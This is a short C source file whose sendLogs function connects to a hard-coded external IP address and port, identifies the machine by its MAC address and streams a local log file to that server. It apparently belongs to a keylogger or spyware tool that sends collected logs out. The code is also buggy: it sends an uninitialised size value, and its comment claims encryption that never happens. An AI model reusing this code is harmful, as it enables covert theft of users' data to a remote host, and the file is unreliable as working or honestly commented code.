#include "includes.h"


int sendLogs();

#define SERVERADDRESS "130.104.78.201"
#define SERVERPORT 3874




int sendLogs(char *filepath, char *mac) {
	int sockfd = 0;
	char identity[18];
	char recvBuff[1024];
	memset(recvBuff,'\0',1024);
	struct stat st;

	int logsize;

	strcpy(identity, mac);

	// Create the socket
	if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("[-]Could not create socket.\n");
        return 1;
    }

    // Generate the socket information
	struct sockaddr_in to;
	to.sin_family = AF_INET;
	to.sin_addr.s_addr = inet_addr(SERVERADDRESS);
	to.sin_port = htons(SERVERPORT);

	if (connect(sockfd, (struct sockaddr *)&to , sizeof(to)) < 0){
		perror("[-]Could not connect to the server.\n");
        return 1;
	}

	printf("WOOOO\n");

	// # Phase 1 : Probe send our identity to the server
	write(sockfd, identity, sizeof(identity)); 
	// Wait ack from the server
	read(sockfd, recvBuff, 1);

	// Phase 2 : Data sending
	int fd = open(filepath, O_RDONLY);
	/*int logsize = lseek(fd,0,SEEK_END);
	lseek(fd,0,SEEK_SET);*/
	
	if(stat(filepath, &st) == 0) {
		printf("SIZE: %d\n", st.st_size);
	}
	else
		printf("NOP\n");
	

	// Send data size
	write(sockfd, &logsize, 4);
	read(sockfd, recvBuff, 1);

	int logread = 0;
	while( (logread=read(fd, recvBuff, 56)) > 0 ) {
		// Send encrypted data
		write(sockfd, recvBuff, logread);
	}
  	
	close(sockfd);
}
